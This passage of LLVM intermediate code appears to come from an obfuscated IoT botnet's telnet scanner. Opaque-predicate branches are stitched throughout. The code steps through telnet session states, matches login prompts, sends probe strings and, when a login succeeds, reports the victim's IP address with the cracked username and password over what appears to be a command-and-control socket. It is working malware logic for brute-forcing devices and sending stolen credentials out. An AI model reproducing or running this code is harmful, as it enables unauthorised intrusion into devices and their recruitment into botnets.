; <label>:1125:                                   ; preds = %1118
  %1126 = load i32, i32* @x.67
  %1127 = load i32, i32* @y.68
  %1128 = sub i32 %1126, 1
  %1129 = mul i32 %1126, %1128
  %1130 = urem i32 %1129, 2
  %1131 = icmp eq i32 %1130, 0
  %1132 = icmp slt i32 %1127, 10
  %1133 = or i1 %1131, %1132
  br i1 %1133, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1125
  %1134 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1135 = load i32, i32* %10, align 4
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1136
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1137, i32 0, i32 6
  store i32 %1134, i32* %1138, align 4
  %1139 = load i32, i32* @x.67
  %1140 = load i32, i32* @y.68
  %1141 = sub i32 %1139, 1
  %1142 = mul i32 %1139, %1141
  %1143 = urem i32 %1142, 2
  %1144 = icmp eq i32 %1143, 0
  %1145 = icmp slt i32 %1140, 10
  %1146 = or i1 %1144, %1145
  br i1 %1146, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1147

; <label>:1147:                                   ; preds = %originalBBpart2124, %1118
  %1148 = load i32, i32* %10, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 0
  %1152 = load i32, i32* %1151, align 16
  %1153 = load i32, i32* %10, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 8
  %1157 = load i8*, i8** %1156, align 8
  %1158 = load i32, i32* %10, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 7
  %1162 = load i16, i16* %1161, align 16
  %1163 = zext i16 %1162 to i32
  %1164 = call i32 @readUntil(i32 %1152, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1157, i32 1024, i32 %1163)
  %1165 = icmp ne i32 %1164, 0
  br i1 %1165, label %1166, label %1241

; <label>:1166:                                   ; preds = %1147
  %1167 = load i32, i32* %10, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1168
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1169, i32 0, i32 6
  store i32 0, i32* %1170, align 4
  %1171 = load i32, i32* %10, align 4
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 7
  store i16 0, i16* %1174, align 16
  %1175 = load i32, i32* %10, align 4
  %1176 = sext i32 %1175 to i64
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1176
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1177, i32 0, i32 8
  %1179 = load i8*, i8** %1178, align 8
  %1180 = call i8* @strstr(i8* %1179, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %1181 = icmp ne i8* %1180, null
  br i1 %1181, label %1182, label %1202

; <label>:1182:                                   ; preds = %1166
  %1183 = load i32, i32* %10, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 8
  %1187 = load i8*, i8** %1186, align 8
  call void @llvm.memset.p0i8.i64(i8* %1187, i8 0, i64 1024, i32 1, i1 false)
  %1188 = load i32, i32* %10, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 16
  %1193 = call i32 @sclose(i32 %1192)
  %1194 = load i32, i32* %10, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 2
  store i8 0, i8* %1197, align 8
  %1198 = load i32, i32* %10, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 3
  store i8 0, i8* %1201, align 1
  br label %1870

; <label>:1202:                                   ; preds = %1166
  %1203 = load i32, i32* %10, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 8
  %1207 = load i8*, i8** %1206, align 8
  %1208 = call i32 @matchPrompt(i8* %1207)
  %1209 = icmp ne i32 %1208, 0
  br i1 %1209, label %1230, label %1210

; <label>:1210:                                   ; preds = %1202
  %1211 = load i32, i32* %10, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 8
  %1215 = load i8*, i8** %1214, align 8
  call void @llvm.memset.p0i8.i64(i8* %1215, i8 0, i64 1024, i32 1, i1 false)
  %1216 = load i32, i32* %10, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 0
  %1220 = load i32, i32* %1219, align 16
  %1221 = call i32 @sclose(i32 %1220)
  %1222 = load i32, i32* %10, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 2
  store i8 0, i8* %1225, align 8
  %1226 = load i32, i32* %10, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 3
  store i8 1, i8* %1229, align 1
  br label %1870

; <label>:1230:                                   ; preds = %1202
  %1231 = load i32, i32* %10, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 2
  store i8 7, i8* %1234, align 8
  br label %1235

; <label>:1235:                                   ; preds = %1230
  %1236 = load i32, i32* %10, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 8
  %1240 = load i8*, i8** %1239, align 8
  call void @llvm.memset.p0i8.i64(i8* %1240, i8 0, i64 1024, i32 1, i1 false)
  br label %1870

; <label>:1241:                                   ; preds = %1147
  %1242 = load i32, i32* %10, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1243
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1244, i32 0, i32 8
  %1246 = load i8*, i8** %1245, align 8
  %1247 = call i64 @strlen(i8* %1246) #10
  %1248 = trunc i64 %1247 to i16
  %1249 = load i32, i32* %10, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1250
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1251, i32 0, i32 7
  store i16 %1248, i16* %1252, align 16
  br label %1253

; <label>:1253:                                   ; preds = %1241
  %1254 = load i32, i32* %10, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 6
  %1258 = load i32, i32* %1257, align 4
  %1259 = add i32 %1258, 30
  %1260 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1261 = icmp ult i32 %1259, %1260
  br i1 %1261, label %1262, label %1277

; <label>:1262:                                   ; preds = %1253
  %1263 = load i32, i32* %10, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 0
  %1267 = load i32, i32* %1266, align 16
  %1268 = call i32 @sclose(i32 %1267)
  %1269 = load i32, i32* %10, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1270
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1271, i32 0, i32 2
  store i8 0, i8* %1272, align 8
  %1273 = load i32, i32* %10, align 4
  %1274 = sext i32 %1273 to i64
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1274
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1275, i32 0, i32 3
  store i8 1, i8* %1276, align 1
  br label %1277

; <label>:1277:                                   ; preds = %1262, %1253
  br label %1869

; <label>:1278:                                   ; preds = %97
  %1279 = load i32, i32* %10, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 0
  %1283 = load i32, i32* %1282, align 16
  %1284 = call i64 @send(i32 %1283, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %1285 = icmp slt i64 %1284, 0
  br i1 %1285, label %1286, label %1301

; <label>:1286:                                   ; preds = %1278
  %1287 = load i32, i32* %10, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1288
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1289, i32 0, i32 0
  %1291 = load i32, i32* %1290, align 16
  %1292 = call i32 @sclose(i32 %1291)
  %1293 = load i32, i32* %10, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 2
  store i8 0, i8* %1296, align 8
  %1297 = load i32, i32* %10, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 3
  store i8 1, i8* %1300, align 1
  br label %1870

; <label>:1301:                                   ; preds = %1278
  %1302 = load i32, i32* @x.67
  %1303 = load i32, i32* @y.68
  %1304 = sub i32 %1302, 1
  %1305 = mul i32 %1302, %1304
  %1306 = urem i32 %1305, 2
  %1307 = icmp eq i32 %1306, 0
  %1308 = icmp slt i32 %1303, 10
  %1309 = or i1 %1307, %1308
  br i1 %1309, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1301
  %1310 = load i32, i32* %10, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 2
  store i8 8, i8* %1313, align 8
  %1314 = load i32, i32* @x.67
  %1315 = load i32, i32* @y.68
  %1316 = sub i32 %1314, 1
  %1317 = mul i32 %1314, %1316
  %1318 = urem i32 %1317, 2
  %1319 = icmp eq i32 %1318, 0
  %1320 = icmp slt i32 %1315, 10
  %1321 = or i1 %1319, %1320
  br i1 %1321, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1869

; <label>:1322:                                   ; preds = %97
  %1323 = load i32, i32* @x.67
  %1324 = load i32, i32* @y.68
  %1325 = sub i32 %1323, 1
  %1326 = mul i32 %1323, %1325
  %1327 = urem i32 %1326, 2
  %1328 = icmp eq i32 %1327, 0
  %1329 = icmp slt i32 %1324, 10
  %1330 = or i1 %1328, %1329
  br i1 %1330, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1322
  %1331 = load i32, i32* %10, align 4
  %1332 = sext i32 %1331 to i64
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1332
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1333, i32 0, i32 0
  %1335 = load i32, i32* %1334, align 16
  %1336 = call i64 @send(i32 %1335, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 85, i32 16384)
  %1337 = icmp slt i64 %1336, 0
  %1338 = load i32, i32* @x.67
  %1339 = load i32, i32* @y.68
  %1340 = sub i32 %1338, 1
  %1341 = mul i32 %1338, %1340
  %1342 = urem i32 %1341, 2
  %1343 = icmp eq i32 %1342, 0
  %1344 = icmp slt i32 %1339, 10
  %1345 = or i1 %1343, %1344
  br i1 %1345, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1337, label %1346, label %1361

; <label>:1346:                                   ; preds = %originalBBpart2132
  %1347 = load i32, i32* %10, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1348
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 0
  %1351 = load i32, i32* %1350, align 16
  %1352 = call i32 @sclose(i32 %1351)
  %1353 = load i32, i32* %10, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 2
  store i8 0, i8* %1356, align 8
  %1357 = load i32, i32* %10, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 3
  store i8 1, i8* %1360, align 1
  br label %1870

; <label>:1361:                                   ; preds = %originalBBpart2132
  %1362 = load i32, i32* %10, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 2
  store i8 9, i8* %1365, align 8
  br label %1869

; <label>:1366:                                   ; preds = %97
  %1367 = load i32, i32* @x.67
  %1368 = load i32, i32* @y.68
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1366
  %1375 = load i32, i32* %10, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 0
  %1379 = load i32, i32* %1378, align 16
  %1380 = call i64 @send(i32 %1379, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %1381 = icmp slt i64 %1380, 0
  %1382 = load i32, i32* @x.67
  %1383 = load i32, i32* @y.68
  %1384 = sub i32 %1382, 1
  %1385 = mul i32 %1382, %1384
  %1386 = urem i32 %1385, 2
  %1387 = icmp eq i32 %1386, 0
  %1388 = icmp slt i32 %1383, 10
  %1389 = or i1 %1387, %1388
  br i1 %1389, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1381, label %1390, label %1421

; <label>:1390:                                   ; preds = %originalBBpart2136
  %1391 = load i32, i32* @x.67
  %1392 = load i32, i32* @y.68
  %1393 = sub i32 %1391, 1
  %1394 = mul i32 %1391, %1393
  %1395 = urem i32 %1394, 2
  %1396 = icmp eq i32 %1395, 0
  %1397 = icmp slt i32 %1392, 10
  %1398 = or i1 %1396, %1397
  br i1 %1398, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1390
  %1399 = load i32, i32* %10, align 4
  %1400 = sext i32 %1399 to i64
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1400
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1401, i32 0, i32 0
  %1403 = load i32, i32* %1402, align 16
  %1404 = call i32 @sclose(i32 %1403)
  %1405 = load i32, i32* %10, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1406
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1407, i32 0, i32 2
  store i8 0, i8* %1408, align 8
  %1409 = load i32, i32* %10, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1410
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1411, i32 0, i32 3
  store i8 1, i8* %1412, align 1
  %1413 = load i32, i32* @x.67
  %1414 = load i32, i32* @y.68
  %1415 = sub i32 %1413, 1
  %1416 = mul i32 %1413, %1415
  %1417 = urem i32 %1416, 2
  %1418 = icmp eq i32 %1417, 0
  %1419 = icmp slt i32 %1414, 10
  %1420 = or i1 %1418, %1419
  br i1 %1420, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1870

; <label>:1421:                                   ; preds = %originalBBpart2136
  %1422 = load i32, i32* @x.67
  %1423 = load i32, i32* @y.68
  %1424 = sub i32 %1422, 1
  %1425 = mul i32 %1422, %1424
  %1426 = urem i32 %1425, 2
  %1427 = icmp eq i32 %1426, 0
  %1428 = icmp slt i32 %1423, 10
  %1429 = or i1 %1427, %1428
  br i1 %1429, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1421
  %1430 = load i32, i32* %10, align 4
  %1431 = sext i32 %1430 to i64
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1431
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1432, i32 0, i32 2
  store i8 10, i8* %1433, align 8
  %1434 = load i32, i32* @x.67
  %1435 = load i32, i32* @y.68
  %1436 = sub i32 %1434, 1
  %1437 = mul i32 %1434, %1436
  %1438 = urem i32 %1437, 2
  %1439 = icmp eq i32 %1438, 0
  %1440 = icmp slt i32 %1435, 10
  %1441 = or i1 %1439, %1440
  br i1 %1441, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1869

; <label>:1442:                                   ; preds = %97
  %1443 = load i32, i32* @x.67
  %1444 = load i32, i32* @y.68
  %1445 = sub i32 %1443, 1
  %1446 = mul i32 %1443, %1445
  %1447 = urem i32 %1446, 2
  %1448 = icmp eq i32 %1447, 0
  %1449 = icmp slt i32 %1444, 10
  %1450 = or i1 %1448, %1449
  br i1 %1450, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1442
  %1451 = load i32, i32* %10, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 6
  %1455 = load i32, i32* %1454, align 4
  %1456 = icmp eq i32 %1455, 0
  %1457 = load i32, i32* @x.67
  %1458 = load i32, i32* @y.68
  %1459 = sub i32 %1457, 1
  %1460 = mul i32 %1457, %1459
  %1461 = urem i32 %1460, 2
  %1462 = icmp eq i32 %1461, 0
  %1463 = icmp slt i32 %1458, 10
  %1464 = or i1 %1462, %1463
  br i1 %1464, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1456, label %1465, label %1471

; <label>:1465:                                   ; preds = %originalBBpart2148
  %1466 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1467 = load i32, i32* %10, align 4
  %1468 = sext i32 %1467 to i64
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1468
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1469, i32 0, i32 6
  store i32 %1466, i32* %1470, align 4
  br label %1471

; <label>:1471:                                   ; preds = %1465, %originalBBpart2148
  %1472 = load i32, i32* %10, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 0
  %1476 = load i32, i32* %1475, align 16
  %1477 = load i32, i32* %10, align 4
  %1478 = sext i32 %1477 to i64
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1478
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1479, i32 0, i32 8
  %1481 = load i8*, i8** %1480, align 8
  %1482 = load i32, i32* %10, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1483
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1484, i32 0, i32 7
  %1486 = load i16, i16* %1485, align 16
  %1487 = zext i16 %1486 to i32
  %1488 = call i32 @readUntil(i32 %1476, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1481, i32 1024, i32 %1487)
  %1489 = icmp ne i32 %1488, 0
  br i1 %1489, label %1490, label %1553

; <label>:1490:                                   ; preds = %1471
  %1491 = load i32, i32* %10, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 6
  store i32 0, i32* %1494, align 4
  %1495 = load i32, i32* %10, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1496
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1497, i32 0, i32 7
  store i16 0, i16* %1498, align 16
  %1499 = load i32, i32* %10, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1500
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1501, i32 0, i32 8
  %1503 = load i8*, i8** %1502, align 8
  %1504 = call i8* @strstr(i8* %1503, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0)) #10
  %1505 = icmp ne i8* %1504, null
  br i1 %1505, label %1506, label %1533

; <label>:1506:                                   ; preds = %1490
  %1507 = load i32, i32* @mainCommSock, align 4
  %1508 = load i32, i32* %10, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 1
  %1512 = bitcast i32* %1511 to %struct.in_addr*
  %1513 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1512, i32 0, i32 0
  %1514 = load i32, i32* %1513, align 4
  %1515 = call i8* @inet_ntoa(i32 %1514) #4
  %1516 = load i32, i32* %10, align 4
  %1517 = sext i32 %1516 to i64
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1517
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1518, i32 0, i32 4
  %1520 = load i8, i8* %1519, align 2
  %1521 = zext i8 %1520 to i64
  %1522 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1521
  %1523 = load i8*, i8** %1522, align 8
  %1524 = load i32, i32* %10, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 5
  %1528 = load i8, i8* %1527, align 1
  %1529 = zext i8 %1528 to i64
  %1530 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1529
  %1531 = load i8*, i8** %1530, align 8
  %1532 = call i32 (i32, i8*, ...) @sockprintf(i32 %1507, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i32 0, i32 0), i8* %1515, i8* %1523, i8* %1531)
  br label %1533

; <label>:1533:                                   ; preds = %1506, %1490
  %1534 = load i32, i32* %10, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 8
  %1538 = load i8*, i8** %1537, align 8
  call void @llvm.memset.p0i8.i64(i8* %1538, i8 0, i64 1024, i32 1, i1 false)
  %1539 = load i32, i32* %10, align 4
  %1540 = sext i32 %1539 to i64
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1540
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1541, i32 0, i32 0
  %1543 = load i32, i32* %1542, align 16
  %1544 = call i32 @sclose(i32 %1543)
  %1545 = load i32, i32* %10, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 3
  store i8 1, i8* %1548, align 1
  %1549 = load i32, i32* %10, align 4
  %1550 = sext i32 %1549 to i64
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1550
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1551, i32 0, i32 2
  store i8 0, i8* %1552, align 8
  br label %1870

; <label>:1553:                                   ; preds = %1471
  %1554 = load i32, i32* %10, align 4
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1555
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1556, i32 0, i32 8
  %1558 = load i8*, i8** %1557, align 8
  %1559 = call i64 @strlen(i8* %1558) #10
  %1560 = trunc i64 %1559 to i16
  %1561 = load i32, i32* %10, align 4
  %1562 = sext i32 %1561 to i64
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1562
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1563, i32 0, i32 7
  store i16 %1560, i16* %1564, align 16
  br label %1565

; <label>:1565:                                   ; preds = %1553
  %1566 = load i32, i32* %10, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1567
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1568, i32 0, i32 6
  %1570 = load i32, i32* %1569, align 4
  %1571 = add i32 %1570, 30
  %1572 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1573 = icmp ult i32 %1571, %1572
  br i1 %1573, label %1574, label %1589

; <label>:1574:                                   ; preds = %1565
  %1575 = load i32, i32* %10, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1576
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1577, i32 0, i32 0
  %1579 = load i32, i32* %1578, align 16
  %1580 = call i32 @sclose(i32 %1579)
  %1581 = load i32, i32* %10, align 4
  %1582 = sext i32 %1581 to i64
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1582
  %1584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1583, i32 0, i32 2
  store i8 0, i8* %1584, align 8
  %1585 = load i32, i32* %10, align 4
  %1586 = sext i32 %1585 to i64
